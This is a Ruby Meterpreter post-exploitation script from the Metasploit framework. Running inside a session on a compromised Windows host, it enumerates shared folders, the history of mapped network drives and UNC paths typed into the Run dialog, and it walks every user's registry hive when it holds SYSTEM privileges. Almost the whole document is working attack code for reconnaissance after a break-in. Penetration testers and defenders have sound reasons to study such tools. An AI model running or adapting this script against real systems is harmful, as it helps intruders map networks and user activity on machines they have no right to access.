##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##



# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ]
  )

opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line "Meterpreter Script for Enumerating Shares Offered, History of Mounted Shares,"
    print_line "History of UNC Paths entered in Run Dialog."
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

# Function for enumerating recent mapped drives on target machine
def enum_recent_mounts(base_key)
  recent_mounts = []
  partial_path = base_key + '\Software\\Microsoft\Windows\CurrentVersion\Explorer'
  full_path = "#{partial_path}\\Map Network Drive MRU"
  explorer_keys = registry_enumkeys(partial_path)
  if explorer_keys.include?("Map Network Drive MRU")
    registry_enumvals(full_path).each do |k|
      if not k =~ /MRUList/
        recent_mounts << registry_getvaldata(full_path,k)
      end
    end
  end
  return recent_mounts
end

# Function for enumerating UNC Paths entered in run dialog box
def enum_run_unc(base_key)
  unc_paths = []
  full_path = base_key + '\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU'
  registry_enumvals(full_path).each do |k|
    if k =~ /./
      run_entrie = registry_getvaldata(full_path,k)
      unc_paths << run_entrie if run_entrie =~ /^\\\\/
    end
  end
  return unc_paths
end

def enum_conf_shares()
  target_os = client.sys.config.sysinfo['OS']
  if target_os =~ /Windows 7|Vista|2008/
    shares_key = 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Shares'
  else
    shares_key = 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\lanmanserver\\Shares'
  end
  shares = registry_enumvals(shares_key)
  if shares.length > 0
    print_status()
    print_status("The following shares where found:")
    shares.each do |s|
      share_info = registry_getvaldata(shares_key,s).split("\000")
      print_status("\tName: #{s}")
      share_info.each do |e|
        name,val = e.split("=")
        print_status("\t#{name}: #{val}") if name =~ /Path|Type/
      end
      print_status()
    end
  end
end

if client.platform =~ /win32|64/
  # Variables to hold info
  mount_history = []
  run_history = []

  # Enumerate shares being offered
  enum_conf_shares()

  if not is_system?
    mount_history = enum_recent_mounts("HKEY_CURRENT_USER")
    run_history = enum_run_unc("HKEY_CURRENT_USER")
  else
    user_sid = []
    key = "HKU\\"
    root_key, base_key = client.sys.registry.splitkey(key)
    open_key = client.sys.registry.open_key(root_key, base_key)
    keys = open_key.enum_key
    keys.each do |k|
      user_sid << k if k =~ /S-1-5-21-\d*-\d*-\d*-\d{3,6}$/
    end
    user_sid.each do |us|
      mount_history = mount_history + enum_recent_mounts("HKU\\#{us.chomp}")
      run_history = run_history + enum_run_unc("HKU\\#{us.chomp}")
    end
  end

  # Enumerate Mount History
  if mount_history.length > 0
    print_status("Recent Mounts found:")
    mount_history.each do |i|
      print_status("\t#{i}")
    end
    print_status()
  end

  #Enumerate UNC Paths entered in the Dialog box
  if run_history.length > 0
    print_status("Recent UNC paths entered in Run Dialog found:")
    run_history.each do |i|
      print_status("\t#{i}")
    end
    print_status()
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
